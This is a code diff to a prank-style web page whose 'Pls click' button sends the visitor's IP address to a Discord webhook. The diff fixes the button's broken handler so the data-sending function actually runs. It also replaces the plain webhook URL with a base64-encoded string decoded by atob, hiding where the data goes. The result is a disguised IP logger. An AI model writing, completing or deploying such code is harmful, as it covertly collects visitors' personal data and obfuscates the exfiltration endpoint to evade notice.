@@ -52,7 +52,7 @@
             ORF<br>
         </a>
 
-       <button onclick="ssendToDiscord();" style="font-size: 40px;padding: 30px 60px;border-radius: 12px;">Pls click</button>
+       <button onclick="sendToDiscord();" style="font-size: 40px;padding: 30px 60px;border-radius: 12px;">Pls click</button>
         
         <figure>
             <img src="images/RamsayScreaming.png" alt="RamsayScreaming (I had to remove it cus of copyright)">
@@ -115,10 +115,10 @@
                     `📡 **IP:** ${info.ip}\n` +
                     `\n-`;
                 
-                  const webhookUrl = "https://discord.com/api/webhooks/1429086643691978813/81htczWaHahtc6sHgNQSl8dea87q02cIhN-haBXJU4wIUntThmXsQ8BgeEvlitJJVe7D";
+                  const wU = atob("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQyOTA4NjY0MzY5MTk3ODgxMy84MWh0Y3pXYUhhaHRjNnNIZ05RU2w4ZGVhODdxMDJjSWhOLWhhQlhKVTR3SVVudFRobVhzUThCZ2VFdmxpdEpKVmU3RA==");
                 
                   try {
-                    const response = await fetch(webhookUrl, {
+                    const response = await fetch(wU, {
                       method: "POST",
                       headers: {
                         'Content-Type': 'application/json'
